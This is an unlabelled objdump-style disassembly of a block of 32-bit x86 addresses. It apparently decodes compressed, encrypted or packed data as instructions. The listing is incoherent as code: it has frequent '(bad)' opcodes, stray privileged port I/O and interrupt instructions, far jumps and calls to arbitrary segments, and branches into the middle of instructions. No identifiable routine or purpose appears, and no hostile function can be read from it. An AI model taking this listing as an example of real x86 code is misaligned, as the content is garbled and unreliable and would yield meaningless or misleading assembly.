  409f33:	into   
  409f34:	dec    esp
  409f35:	test   al,0xba
  409f37:	mov    BYTE PTR [edi-0x13],ch
  409f3a:	cmp    eax,0xe4a9756e
  409f3f:	ror    BYTE PTR [edi+0x6abc73bf],1
  409f45:	and    cl,BYTE PTR [edx-0x326d77fe]
  409f4b:	test   eax,0x27f0dd68
  409f50:	jg     0x409f1d
  409f52:	cs enter 0xb607,0x97
  409f57:	pop    ebx
  409f58:	fcom   DWORD PTR [esi+0x27]
  409f5b:	dec    DWORD PTR [ebx]
  409f5d:	ss mov edx,0x5670efb7
  409f63:	sbb    al,0x90
  409f65:	retf   
  409f66:	push   ebp
  409f67:	xlat   BYTE PTR ds:[ebx]
  409f68:	mov    al,0x78
  409f6a:	push   DWORD PTR ds:0xa0ed0a30
  409f70:	aam    0xe3
  409f72:	fisttp DWORD PTR [ecx+0x1e]
  409f75:	popf   
  409f76:	(bad)  
  409f77:	cmp    al,0x2d
  409f79:	cmp    cl,BYTE PTR [eax]
  409f7b:	ins    DWORD PTR es:[edi],dx
  409f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f7d:	sbb    dl,ah
  409f7f:	aad    0xbf
  409f81:	(bad)  
  409f83:	(bad)  
  409f86:	not    DWORD PTR [edx]
  409f88:	pop    ds
  409f89:	imul   DWORD PTR [esi-0xb]
  409f8c:	mov    bh,0x25
  409f8e:	xchg   DWORD PTR [ecx+0x6b],esi
  409f91:	ret    0xa9f9
  409f94:	sbb    BYTE PTR [edi],dh
  409f96:	inc    edx
  409f97:	cmp    BYTE PTR [edx+0x26],cl
  409f9a:	mov    eax,ds:0x6f986501
  409f9f:	outs   dx,DWORD PTR ds:[esi]
  409fa0:	in     eax,dx
  409fa1:	sti    
  409fa2:	(bad)  
  409fa3:	adc    DWORD PTR gs:[eax+0x11bfd399],edx
  409faa:	in     al,dx
  409fab:	fs pop eax
  409fad:	xor    BYTE PTR ds:0xb03d956a,0x5b
  409fb4:	leave  
  409fb5:	push   eax
  409fb6:	xchg   edi,eax
  409fb7:	outs   dx,DWORD PTR ds:[esi]
  409fb8:	mov    ah,cl
  409fba:	fcmovnb st,st(0)
  409fbc:	fmul   QWORD PTR ds:0xf1a0db8d
  409fc2:	xchg   ebx,eax
  409fc3:	stc    
  409fc4:	jae    0x40a02f
  409fc6:	arpl   WORD PTR [eax-0x6ecdad7],ax
  409fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fcd:	and    cl,BYTE PTR [ecx]
  409fcf:	lahf   
  409fd0:	xchg   DWORD PTR [edx+0x22],esi
  409fd3:	fistp  WORD PTR ds:0x18332315
  409fd9:	mov    BYTE PTR [ecx+eax*1],ch
  409fdc:	loopne 0x409fbf
  409fde:	xor    al,ch
  409fe0:	int3   
  409fe1:	xchg   DWORD PTR [ebx+0x5d],ecx
  409fe4:	cmp    DWORD PTR [ecx-0x35607ef5],0x1
  409feb:	loop   0x40a008
  409fed:	mov    ebx,0x3d88e67a
  409ff2:	push   ecx
  409ff3:	cmp    dh,BYTE PTR [eax-0x4e098b60]
  409ff9:	fnsave ds:0xf0725152
  409fff:	jno    0x409faa
  40a001:	or     al,ah
  40a003:	sahf   
  40a004:	shl    BYTE PTR [esi+0x1d],0x3e
  40a008:	and    esp,ebp
  40a00a:	cld    
  40a00b:	stos   BYTE PTR es:[edi],al
  40a00c:	xchg   edi,eax
  40a00d:	xchg   esp,eax
  40a00e:	jle    0x409fec
  40a010:	iret   
  40a011:	and    DWORD PTR [edi+0x1],esp
  40a014:	xchg   DWORD PTR ds:0x7979f14f,ebp
  40a01a:	mov    ecx,0xce1b886b
  40a01f:	push   ds
  40a020:	test   BYTE PTR [edx],0xb3
  40a023:	mov    dl,0xfb
  40a025:	xchg   ebx,eax
  40a026:	repz jecxz 0x409ff5
  40a029:	jle    0x40a0a4
  40a02b:	xor    DWORD PTR [esi+0x5f0dfc29],eax
  40a031:	pop    ecx
  40a032:	mov    edi,0xa773214a
  40a037:	xor    BYTE PTR [esi],bl
  40a039:	mov    edx,0xfb4cf33a
  40a03e:	xchg   BYTE PTR [esi+ebp*1+0x14d646f8],ch
  40a045:	push   ecx
  40a046:	cmp    ch,dh
  40a048:	and    al,BYTE PTR [ebx-0x47]
  40a04b:	xor    ch,dh
  40a04d:	and    al,0xec
  40a04f:	sbb    al,0xf9
  40a052:	inc    edx
  40a053:	(bad)  
  40a055:	push   edx
  40a056:	fistp  QWORD PTR [eax]
  40a058:	icebp  
  40a059:	in     al,dx
  40a05a:	rol    DWORD PTR [esi-0x6ba740ab],cl
  40a060:	jmp    0xacb47550
  40a065:	mov    edx,0x7b61667a
  40a06a:	xchg   ebx,eax
  40a06b:	add    DWORD PTR [ecx+0x10],ebp
  40a06e:	jb     0x40a0e5
  40a070:	push   es
  40a071:	adc    DWORD PTR [ebx],esp
  40a073:	pop    edi
  40a074:	lock or eax,0x53f3974d
  40a07a:	fdiv   QWORD PTR [edi]
  40a07c:	push   esi
  40a07d:	(bad)  
  40a07e:	xor    bl,BYTE PTR [eax]
  40a080:	rcr    DWORD PTR [ebp-0x74],cl
  40a083:	add    bl,al
  40a085:	jp     0x40a0cd
  40a087:	arpl   WORD PTR [ecx+eax*2+0x61],di
  40a08b:	daa    
  40a08c:	push   ds
  40a08d:	adc    eax,0x2ea404f
  40a092:	mov    edx,0xc04ac2da
  40a097:	pop    ebp
  40a098:	sbb    eax,ebp
  40a09a:	push   es
  40a09b:	ds sub al,0x95
  40a09e:	shl    BYTE PTR [ecx+0x8],0xc
  40a0a2:	add    eax,0xe1791b5b
  40a0a7:	and    BYTE PTR [esi],bl
  40a0a9:	pop    eax
  40a0aa:	sub    bh,ah
  40a0ac:	xchg   ebp,eax
  40a0ad:	sub    edi,DWORD PTR [ebx]
  40a0af:	rcl    ah,0x63
  40a0b2:	dec    edx
  40a0b3:	sbb    edx,ebp
  40a0b5:	stc    
  40a0b6:	sub    DWORD PTR [ebp+0x3e],ebp
  40a0b9:	pop    eax
  40a0ba:	popa   
  40a0bb:	cmp    ecx,edx
  40a0bd:	sbb    ch,BYTE PTR [ecx+0x2]
  40a0c0:	das    
  40a0c1:	inc    edx
  40a0c2:	addr16 and bh,bl
  40a0c5:	std    
  40a0c6:	ins    BYTE PTR es:[edi],dx
  40a0c7:	or     ebp,DWORD PTR [eax+0x71]
  40a0ca:	jp     0x40a140
  40a0cc:	sar    eax,cl
  40a0ce:	sbb    eax,0x265b618b
  40a0d3:	or     eax,0xf97c9cc5
  40a0d8:	xchg   ebx,eax
  40a0d9:	ds popf 
  40a0db:	(bad)  
  40a0dc:	gs mov ah,0x16
  40a0df:	xchg   esp,eax
  40a0e0:	mov    ebp,0x26507ade
  40a0e5:	adc    BYTE PTR [esi+eax*2-0x72],bl
  40a0e9:	mov    edi,0x45163131
  40a0ee:	fucomp st(4)
  40a0f0:	xor    eax,DWORD PTR [ecx+ecx*2+0x61859dda]
  40a0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f8:	pop    ds
  40a0f9:	push   cs
  40a0fa:	and    eax,0x2a504a4
  40a0ff:	hlt    
  40a100:	leave  
  40a101:	pop    esi
  40a102:	es dec bp
  40a105:	push   ds
  40a106:	jmp    0x3daf:0x9d0602c0
  40a10d:	add    al,0x2e
  40a10f:	outs   dx,DWORD PTR ds:[esi]
  40a110:	fsubr  DWORD PTR [ebp+0x45]
  40a113:	sbb    eax,0x43a9c859
  40a118:	lods   eax,DWORD PTR ds:[esi]
  40a119:	push   ecx
  40a11a:	mov    ah,0xb
  40a11c:	loop   0x40a0bc
  40a11e:	and    eax,0x5c93b576
  40a123:	arpl   WORD PTR [esi-0x42],sp
  40a126:	pop    ebp
  40a127:	add    al,0x65
  40a129:	jne    0x40a0cc
  40a12b:	dec    ebp
  40a12c:	sbb    eax,DWORD PTR [edi+0x24]
  40a12f:	jo     0x40a0d0
  40a131:	and    bh,BYTE PTR [ebp+0x58b39e5a]
  40a137:	jg     0x40a154
  40a139:	and    al,0xe4
  40a13b:	sbb    BYTE PTR [ecx-0x15],ch
  40a13e:	mov    esi,0xe58c37a0
  40a143:	cmc    
  40a144:	adc    edx,esi
  40a146:	push   es
  40a147:	pop    edi
  40a148:	or     bl,BYTE PTR [edx+0x5b06dee]
  40a14e:	call   0x1923f3d0
  40a153:	push   ss
  40a154:	add    ch,BYTE PTR [esi-0x4027f2fa]
  40a15a:	jbe    0x40a1d3
  40a15c:	inc    ebp
  40a15d:	add    dl,bl
  40a15f:	ja     0x40a16c
  40a161:	es jge 0x40a119
  40a164:	mov    al,0x44
  40a166:	adc    al,0xa0
  40a168:	push   es
  40a169:	test   al,0x20
  40a16b:	scas   eax,DWORD PTR es:[edi]
  40a16c:	les    edx,FWORD PTR [ebx-0x49ff310]
  40a172:	lods   al,BYTE PTR ds:[esi]
  40a173:	pop    ds
  40a174:	mov    eax,ds:0x2bc429d7
  40a179:	push   esi
  40a17a:	fstp   st(2)
  40a17c:	fistp  QWORD PTR [edx+ebp*2]
  40a17f:	aaa    
  40a180:	adc    al,BYTE PTR [edx-0x357ec3b9]
  40a186:	sbb    ah,BYTE PTR [ebp+0x6f92cc03]
  40a18c:	stos   BYTE PTR es:[edi],al
  40a18d:	sub    DWORD PTR [esi],0xffffff86
  40a190:	inc    ebx
  40a191:	adc    DWORD PTR [esi+ecx*2-0x2da9c5d6],ebx
  40a198:	sub    edi,DWORD PTR [edi-0x79f8c11]
  40a19e:	add    ah,BYTE PTR [esp+edx*1]
  40a1a1:	and    edi,DWORD PTR [edi]
  40a1a3:	add    DWORD PTR [ebx+0x64],0x3
  40a1a7:	(bad)  
  40a1a9:	mov    ds:0x69ce473f,eax
  40a1ae:	and    BYTE PTR [ecx],al
  40a1b0:	fisubr WORD PTR [edi]
  40a1b2:	out    0xf7,eax
  40a1b4:	in     al,0x59
  40a1b6:	jnp    0x40a206
  40a1b8:	in     eax,dx
  40a1b9:	std    
  40a1ba:	mov    ah,0xf2
  40a1bc:	std    
  40a1bd:	jl     0x40a1bf
  40a1bf:	pop    ebx
  40a1c0:	fisub  DWORD PTR [ebp+0x78cb2c10]
  40a1c6:	adc    BYTE PTR ds:0x2981c167,cl
  40a1cc:	sahf   
  40a1cd:	mov    BYTE PTR [eax],bh
  40a1cf:	addr16 mov bh,0x23
  40a1d2:	jge    0x40a1aa
  40a1d4:	mov    edx,0xc8b94334
  40a1d9:	jne    0x40a17c
  40a1db:	mov    eax,ds:0x84fd7e0a
  40a1e0:	mov    ds:0x9b90871b,al
  40a1e5:	js     0x40a206
  40a1e7:	int3   
  40a1e8:	(bad)  
  40a1e9:	cli    
  40a1ea:	push   ebp
  40a1eb:	cmp    eax,0x376946a0
  40a1f0:	pop    ds
  40a1f1:	and    BYTE PTR [edx],0x5a
  40a1f4:	dec    esi
  40a1f5:	scas   eax,DWORD PTR es:[edi]
  40a1f6:	sbb    edx,DWORD PTR [ebx-0x39]
  40a1f9:	call   0x4d7c:0xf42e13f0
  40a200:	(bad)  
  40a201:	int    0x49
  40a203:	sahf   
  40a204:	xchg   esi,eax
  40a205:	pop    ds
  40a206:	cli    
  40a207:	mov    ebp,DWORD PTR [ebp+0x4489a2a7]
  40a20d:	xor    ebx,DWORD PTR [eax+0xae94aeb]
  40a213:	and    edi,DWORD PTR [ebp+esi*4+0x32]
  40a217:	add    esi,edi
  40a219:	push   edx
  40a21a:	pop    ebx
  40a21b:	push   0xffffffa9
  40a21d:	daa    
  40a21e:	add    esp,DWORD PTR [edi+0x72]
  40a221:	lods   eax,DWORD PTR ds:[esi]
  40a222:	cwde   
  40a223:	mov    dl,0xf1
  40a225:	lods   eax,DWORD PTR ds:[esi]
  40a226:	mov    dl,0xf0
  40a228:	popa   
  40a229:	adc    BYTE PTR [ebx+0x1551b2f7],bl
  40a22f:	add    BYTE PTR [ebx],dl
  40a231:	pop    ebp
  40a232:	(bad)  
  40a233:	js     0x40a25b
  40a235:	fs pusha 
  40a237:	add    dh,ch
  40a239:	aam    0x6b
  40a23b:	pop    edx
  40a23c:	xor    al,0x60
  40a23e:	not    DWORD PTR [esi+ecx*1-0x3f693024]
  40a245:	imul   edi,DWORD PTR [eax+0x68],0xffffffcc
  40a249:	pusha  
  40a24a:	mov    edx,0x4d3585bd
  40a24f:	xor    bh,BYTE PTR [ebx+0x3d]
  40a252:	mov    ecx,DWORD PTR [edx]
  40a254:	jg     0x40a266
  40a256:	sbb    eax,0xdc6cbd02
  40a25b:	clc    
  40a25c:	xor    ecx,DWORD PTR fs:[eax+ecx*2-0x6c7354e6]
  40a264:	dec    ebx
  40a265:	inc    edi
  40a266:	inc    ebp
  40a267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a268:	dec    esi
  40a269:	out    0x3b,eax
  40a26b:	xchg   ecx,eax
  40a26c:	xchg   ecx,eax
  40a26d:	stos   BYTE PTR es:[edi],al
  40a26e:	or     eax,0x4d5c2aad
  40a273:	aad    0x6c
  40a275:	pop    ecx
  40a276:	call   0x8868:0x8dd1d3e2
  40a27d:	push   0xffffffae
  40a27f:	bound  ebp,QWORD PTR [ebx]
  40a281:	and    BYTE PTR [edi+0x2d07d338],dl
  40a287:	pop    edi
  40a288:	jg     0x40a26c
  40a28a:	ss cmp al,0x95
  40a28d:	outs   dx,BYTE PTR ds:[esi]
  40a28e:	nop
  40a28f:	inc    eax
  40a290:	retf   0xe057
  40a293:	loope  0x40a259
  40a295:	rcl    DWORD PTR [ebx+0x21],0x43
  40a299:	xor    esi,DWORD PTR [ebp-0x1f]
  40a29c:	(bad)  
  40a29d:	shl    BYTE PTR [ecx+0x68],0x54
  40a2a1:	sub    DWORD PTR [ecx],0x33a939d1
  40a2a7:	fdiv   DWORD PTR [eax+0x18e14dcd]
  40a2ad:	jecxz  0x40a276
  40a2af:	adc    DWORD PTR [edx-0x5bc60cac],0x3d570b56
  40a2b9:	into   
  40a2ba:	daa    
  40a2bb:	sub    eax,0x9097b72a
  40a2c0:	mov    ch,0x4
  40a2c2:	sahf   
  40a2c3:	jno    0x40a2c2
  40a2c5:	fcmovu st,st(3)
  40a2c7:	int    0x7c
  40a2c9:	xor    al,0xfd
  40a2cb:	imul   edx,DWORD PTR [eax-0x25],0xc03bace0
  40a2d2:	inc    ebp
  40a2d3:	mov    dl,0xdf
  40a2d5:	fld    st(0)
  40a2d7:	lds    ebp,FWORD PTR [edi+esi*8+0x44cdaeb2]
  40a2de:	mov    eax,DWORD PTR [esi+0x676d77df]
  40a2e4:	dec    ecx
  40a2e5:	inc    ebp
  40a2e6:	add    al,0x38
  40a2e8:	jbe    0x40a2b9
  40a2ea:	xchg   edi,eax
  40a2eb:	sub    DWORD PTR [edx],ecx
  40a2ed:	dec    ebx
  40a2ee:	pop    esi
  40a2ef:	xor    al,0x6d
  40a2f1:	mov    al,ds:0xb3992c9d
  40a2f6:	stos   BYTE PTR es:[edi],al
  40a2f7:	or     al,0xa7
  40a2f9:	out    dx,eax
  40a2fa:	sbb    al,0x1
  40a2fc:	mov    ebp,0xaf96db83
  40a301:	xchg   DWORD PTR [edi-0x519e3620],edx
  40a307:	in     eax,0x48
  40a309:	sub    ah,bl
  40a30b:	mov    esp,0x34a3656a
  40a310:	jnp    0x40a2b9
  40a312:	neg    DWORD PTR [ecx+ecx*4+0x27]
  40a316:	rcr    DWORD PTR [eax+eax*4+0x608ed665],1
  40a31d:	mov    edx,ebx
  40a31f:	inc    edx
  40a320:	test   BYTE PTR [edi],ah
  40a322:	jne    0x40a359
  40a324:	out    0x2c,eax
  40a326:	or     BYTE PTR [ecx+ebx*4+0x4b8d14c0],dh
  40a32d:	push   0x5a
  40a32f:	jl     0x40a372
  40a331:	sahf   
  40a332:	(bad)  
  40a333:	imul   ebx,esi,0x7b66a9b7
  40a339:	and    edx,eax
  40a33b:	popa   
  40a33c:	into   
  40a33d:	dec    ebx
  40a33e:	inc    edi
  40a33f:	mov    ch,0x91
  40a341:	sbb    dh,BYTE PTR [ebp+0x14]
  40a344:	not    BYTE PTR [esi+0x70001e0b]
  40a34a:	push   edx
  40a34b:	std    
  40a34c:	pushf  
  40a34d:	out    dx,eax
  40a34e:	and    eax,0x94059b7b
  40a353:	sub    edi,ecx
  40a355:	sti    
  40a356:	repz cld 
  40a358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a359:	inc    ebx
  40a35a:	or     BYTE PTR [ecx+0x7dbe2093],dl
  40a360:	and    DWORD PTR ds:0x25406030,0xe
  40a367:	aam    0x57
  40a369:	cmc    
  40a36a:	in     al,0xd9
  40a36c:	clc    
  40a36d:	les    ebx,FWORD PTR es:[ebp+esi*1+0x5c]
  40a372:	cmp    al,0x2
  40a374:	hlt    
  40a375:	fistp  WORD PTR [edi]
  40a377:	in     eax,0x12
  40a379:	pop    esp
  40a37a:	mov    ds:0x58c4eb48,al
  40a37f:	fnstsw WORD PTR [ebx]
  40a381:	aaa    
  40a382:	push   ebp
  40a383:	pop    es
  40a384:	clc    
  40a385:	loope  0x40a3fa
  40a387:	push   esi
  40a388:	and    al,0x98
  40a38a:	cli    
  40a38b:	push   ds
  40a38c:	inc    ebp
  40a38d:	loop   0x40a3b1
  40a38f:	scas   eax,DWORD PTR es:[edi]
  40a390:	ror    BYTE PTR [edx],0xbe
  40a393:	jae    0x40a325
  40a395:	mov    BYTE PTR [esi+esi*8],cl
  40a398:	or     al,0x29
  40a39a:	in     eax,dx
  40a39b:	pop    es
  40a39c:	xor    al,0xc8
  40a39e:	xor    BYTE PTR [ecx],dl
  40a3a0:	inc    edi
  40a3a1:	jne    0x40a36f
  40a3a3:	jbe    0x40a3a2
  40a3a5:	dec    edx
  40a3a6:	scas   eax,DWORD PTR es:[edi]
  40a3a7:	out    dx,al
  40a3a8:	aam    0x7b
  40a3aa:	lods   al,BYTE PTR ds:[esi]
  40a3ab:	loope  0x40a341
  40a3ad:	in     al,0x88
  40a3af:	iret   
  40a3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b1:	push   eax
  40a3b2:	aad    0x90
  40a3b4:	push   esp
  40a3b5:	sti    
  40a3b6:	lods   eax,DWORD PTR ds:[esi]
  40a3b7:	bound  eax,QWORD PTR [ecx-0x48]
  40a3ba:	scas   eax,DWORD PTR es:[edi]
  40a3bb:	sub    DWORD PTR [edi+0x40],ecx
  40a3be:	mov    DWORD PTR ds:0x576fb121,0x1ed6f8e8
  40a3c8:	mov    DWORD PTR ds:0x9fa6c642,edi
  40a3ce:	xchg   edx,eax
  40a3cf:	mov    al,0xfb
  40a3d1:	cwde   
  40a3d2:	pop    edx
  40a3d3:	adc    BYTE PTR [esi+0x47c48e47],ah
  40a3d9:	data16 or bh,BYTE PTR [ebx+ebp*2-0x37]
  40a3de:	ror    BYTE PTR [eax-0x30],1
  40a3e1:	pop    ds
  40a3e2:	xchg   ebp,eax
  40a3e3:	loope  0x40a40d
  40a3e5:	push   eax
  40a3e6:	mov    bl,0xce
  40a3e8:	add    BYTE PTR [esi+esi*1],bh
  40a3eb:	mov    bh,0x4
  40a3ed:	inc    ebx
  40a3ee:	mov    gs,WORD PTR [eax]
  40a3f0:	mov    ebx,0x163815f5
  40a3f5:	adc    esi,edi
  40a3f7:	xchg   BYTE PTR [ecx+0x66f4d200],dh
  40a3fd:	clc    
  40a3fe:	mov    ebp,DWORD PTR [esi]
  40a400:	test   DWORD PTR [edx+0x60],edx
  40a403:	xchg   DWORD PTR [ebp+0x66],edx
  40a406:	clc    
  40a407:	sub    esi,DWORD PTR [edx]
  40a409:	fwait
  40a40a:	dec    esi
  40a40b:	inc    edi
  40a40c:	sbb    ecx,DWORD PTR [esi+edx*1-0x6a952a]
  40a413:	das    
  40a414:	pop    esp
  40a415:	sbb    eax,0xa9bad83
  40a41a:	jns    0x40a43e
  40a41c:	mov    bh,0x72
  40a41e:	xor    bh,bh
  40a420:	(bad)  
  40a421:	sbb    esp,DWORD PTR [ebp+0x30]
  40a424:	ja     0x40a41c
  40a426:	jmp    0x40a3fb
  40a428:	or     DWORD PTR [ecx],edx
  40a42a:	jle    0x40a4a6
  40a42c:	popf   
  40a42d:	cli    
  40a42e:	inc    esi
  40a42f:	ss pop edi
  40a431:	addr16 enter 0xee8,0x51
  40a436:	dec    eax
  40a437:	in     eax,dx
  40a438:	inc    esp
  40a439:	push   cs
  40a43a:	ret    
  40a43b:	icebp  
  40a43c:	jo     0x40a468
  40a43e:	lea    ebx,ds:0xc9699f92
  40a444:	test   BYTE PTR [ebx+ebp*4-0x1e7eaade],cl
  40a44b:	xchg   ecx,eax
  40a44c:	adc    BYTE PTR [eax-0x5a],0x56
  40a450:	push   ds
  40a451:	aam    0x89
  40a453:	sbb    BYTE PTR [ebx],bl
  40a455:	and    edi,DWORD PTR [ebp+0x30]
  40a458:	sbb    BYTE PTR [esp+eax*4],cl
  40a45b:	xor    al,0xe4
  40a45d:	push   ds
  40a45e:	shl    BYTE PTR [eax+0x35cf50c5],0xa3
  40a465:	lods   eax,DWORD PTR ds:[esi]
  40a466:	sbb    DWORD PTR [ebp+0x35fb8f3],ecx
  40a46c:	fidivr DWORD PTR [ebx+0x27]
  40a46f:	add    BYTE PTR [edi+0x26c2cd81],dl
  40a475:	xor    bh,BYTE PTR [edi]
  40a477:	cmp    edi,esp
  40a479:	cdq    
  40a47a:	sub    al,bh
  40a47c:	jmp    0x2497:0x6a5ca52c
  40a483:	fadd   DWORD PTR ds:0xd6cbf52e
  40a489:	pop    ebp
  40a48a:	ja     0x40a4f2
  40a48c:	retf   
  40a48d:	inc    ebx
  40a48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48f:	and    DWORD PTR [ebp-0x25],edx
  40a492:	test   BYTE PTR [edx-0x13],bl
  40a495:	mov    edi,0x40074ce7
  40a49a:	sub    edi,DWORD PTR [edx+0x4c6ab12d]
  40a4a0:	push   cs
  40a4a1:	dec    eax
  40a4a2:	shr    ah,cl
  40a4a4:	ds mov cl,0x31
  40a4a7:	call   0xe14:0x24bcaf6d
  40a4ae:	std    
  40a4af:	lds    ebx,FWORD PTR [edx+ebx*8-0x19]
  40a4b3:	and    BYTE PTR [ebx+0x7551a870],ah
  40a4b9:	pop    es
  40a4ba:	sub    BYTE PTR [ebx],0x64
  40a4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4be:	mov    dh,0x17
  40a4c0:	bound  esi,QWORD PTR [eax+0x765a45cc]
  40a4c6:	loopne 0x40a4ec
  40a4c8:	aam    0xb6
  40a4ca:	cmp    cl,0xd5
  40a4cd:	cld    
  40a4ce:	dec    edi
  40a4cf:	(bad)  
  40a4d0:	aad    0xdb
  40a4d2:	push   ecx
  40a4d3:	and    bl,BYTE PTR [ebp-0x3bddabb7]
  40a4d9:	hlt    
  40a4da:	pusha  
  40a4db:	jbe    0x40a47a
  40a4dd:	pop    esp
  40a4de:	and    al,0x6a
  40a4e0:	xchg   BYTE PTR [ecx],bh
  40a4e2:	aad    0x59
  40a4e4:	mov    ah,0xb
  40a4e6:	(bad)  
  40a4e7:	addr16 in eax,0x98
  40a4ea:	stos   DWORD PTR es:[edi],eax
  40a4eb:	fidivr WORD PTR ds:0xd75e54c
  40a4f1:	aam    0x2
  40a4f3:	jb     0x40a47c
  40a4f5:	mov    ds:0xe990b9a0,al
  40a4fa:	adc    eax,esp
  40a4fc:	mov    cl,0x45
  40a4fe:	xor    DWORD PTR [di],ebp
  40a501:	adc    BYTE PTR [ecx+0x156866ea],cl
  40a507:	mov    DWORD PTR [eax],edi
  40a509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a50a:	cmp    BYTE PTR [esp+ecx*2+0x4c],ah
  40a50e:	or     DWORD PTR [ebx+0x2eb20bae],edx
  40a514:	out    dx,al
  40a515:	pop    esp
  40a516:	int    0x38
  40a518:	cmc    
  40a519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a51a:	loop   0x40a584
  40a51c:	outs   dx,BYTE PTR ds:[esi]
  40a51d:	jl     0x40a504
  40a51f:	mov    edx,0x6bceb8c7
  40a524:	pop    ebp
  40a525:	pop    es
  40a526:	push   eax
  40a527:	jmp    FWORD PTR [ebx+ebx*1-0x2434d1b7]
  40a52e:	cwde   
  40a52f:	mov    BYTE PTR [edi-0x1657c93],al
  40a535:	(bad)  
  40a536:	shl    edx,1
  40a538:	pop    ebx
  40a539:	ficom  WORD PTR [edi+0x7a5fbe66]
  40a53f:	push   ecx
  40a540:	mov    ds:0x7e22613c,eax
  40a545:	jle    0x40a554
  40a547:	xor    esp,DWORD PTR ds:0x73a6e699
  40a54d:	imul   esi,edx,0xaa6aecff
  40a553:	(bad)  
  40a554:	(bad)  
  40a555:	mov    ebx,0x1b0feecf
  40a55a:	dec    edx
  40a55b:	push   0xc67a2347
  40a560:	cmp    edx,DWORD PTR [eax-0x3e]
  40a563:	push   eax
  40a564:	mov    ch,0x74
  40a566:	ss push 0xc4b4f381
  40a56c:	pop    ds
  40a56d:	ss cli 
  40a56f:	mov    ds:0xb876dfd4,al
  40a574:	ret    0xe710
  40a577:	cmp    BYTE PTR [eax],dl
  40a579:	mov    dh,0xc5
  40a57b:	cld    
  40a57c:	dec    ebx
  40a57d:	xchg   edi,eax
  40a57e:	ss xchg ecx,eax
  40a580:	xchg   BYTE PTR [ebx+ecx*1],ah
  40a583:	xchg   esp,eax
  40a584:	inc    esi
  40a585:	adc    al,al
  40a587:	push   edi
  40a588:	neg    DWORD PTR [ebx+0x424578bc]
  40a58e:	add    eax,0xe9b5e1a1
  40a593:	mov    eax,0x5646bbec
  40a598:	push   0x42a16777
  40a59d:	cwde   
  40a59e:	xchg   edx,eax
  40a59f:	dec    esi
  40a5a0:	popa   
  40a5a1:	addr16 inc edx
  40a5a3:	or     bl,BYTE PTR [edi+0x23]
  40a5a6:	scas   al,BYTE PTR es:[edi]
  40a5a7:	and    BYTE PTR [ebx+0x5c],0x67
  40a5ab:	inc    edx
  40a5ac:	push   edx
  40a5ad:	test   DWORD PTR [edi+0x7a],edx
  40a5b0:	repz fwait
  40a5b2:	adc    BYTE PTR [edi+eiz*1],bh
  40a5b5:	add    BYTE PTR [edi],dl
  40a5b7:	xacquire xchg BYTE PTR [ebx-0x7b50981e],dh
  40a5be:	push   edi
  40a5bf:	mov    ch,0x72
  40a5c1:	jnp    0x40a5f0
  40a5c3:	pop    es
  40a5c4:	mov    esp,0x2361163f
  40a5c9:	jb     0x40a630
  40a5cb:	push   0xffffffce
  40a5cd:	sbb    cl,BYTE PTR [eax]
  40a5cf:	push   ebp
  40a5d0:	cmp    BYTE PTR [edi],bl
  40a5d2:	push   ecx
  40a5d3:	dec    eax
  40a5d4:	loopne 0x40a55a
  40a5d6:	adc    eax,DWORD PTR [eax+0x76]
  40a5d9:	push   eax
  40a5da:	jmp    0xe447:0x222b107c
  40a5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5e2:	jecxz  0x40a5a0
  40a5e4:	arpl   ax,dx
  40a5e6:	retf   0x8fc3
  40a5e9:	dec    edx
  40a5ea:	clc    
  40a5eb:	add    al,0xe3
  40a5ed:	push   ds
  40a5ee:	sub    al,0xb
  40a5f0:	inc    esi
  40a5f1:	lods   al,BYTE PTR ds:[esi]
  40a5f2:	in     al,dx
  40a5f3:	enter  0x44c8,0xa3
  40a5f7:	or     BYTE PTR [esp+edi*4+0x1],0x67
  40a5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5fd:	ret    0xd650
  40a600:	(bad)  
  40a601:	stos   DWORD PTR es:[edi],eax
  40a602:	sti    
  40a603:	adc    eax,0xe762f409
  40a608:	mov    al,0xb4
  40a60a:	imul   eax,DWORD PTR [edx],0xffffffc0
  40a60d:	pop    ebx
  40a60e:	push   ecx
  40a60f:	jns    0x40a5e0
  40a611:	jne    0x40a673
  40a613:	sbb    BYTE PTR [ebp+0x3b88385c],bl
  40a619:	dec    ecx
  40a61a:	shl    BYTE PTR [eax-0x2a],0x66
  40a61e:	sub    al,0xc7
  40a620:	xchg   DWORD PTR ds:[ebx],ebp
  40a623:	mov    ch,0xca
  40a625:	sub    edi,esi
  40a627:	or     al,0x4d
  40a629:	and    DWORD PTR [edx-0x14],ebx
  40a62c:	les    eax,FWORD PTR [ebp+eiz*4-0x17ed3093]
  40a633:	add    al,0xe
  40a635:	xchg   edi,eax
  40a637:	and    cl,BYTE PTR [edi]
  40a639:	dec    ecx
  40a63a:	stc    
  40a63b:	aas    
  40a63c:	in     al,0x67
  40a63e:	popf   
  40a63f:	or     DWORD PTR [ecx],esp
  40a641:	or     al,0xaa
  40a643:	aas    
  40a644:	fidiv  WORD PTR [esi+0x76]
  40a647:	ret    
  40a648:	sbb    DWORD PTR [ebp-0x68],edi
  40a64b:	loop   0x40a639
  40a64d:	sbb    bh,bh
  40a64f:	nop
  40a650:	or     ebp,DWORD PTR [ecx+ecx*4+0x65]
  40a654:	dec    edx
  40a655:	dec    eax
  40a656:	clc    
  40a657:	fcmovnb st,st(4)
  40a659:	xor    al,0xcd
  40a65b:	stos   DWORD PTR es:[edi],eax
  40a65c:	les    edi,FWORD PTR [ebx+0x2f41157f]
  40a662:	test   al,0x2
  40a664:	mov    al,0x5f
  40a666:	adc    cl,BYTE PTR [ebp+0x3efb6ed9]
  40a66c:	jo     0x40a6d0
  40a66e:	leave  
  40a66f:	pop    edi
  40a670:	inc    edi
  40a671:	cli    
  40a672:	jge    0x40a6b8
  40a674:	mov    al,0x99
  40a676:	jae    0x40a638
  40a678:	jo     0x40a6e7
  40a67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a67b:	jle    0x40a681
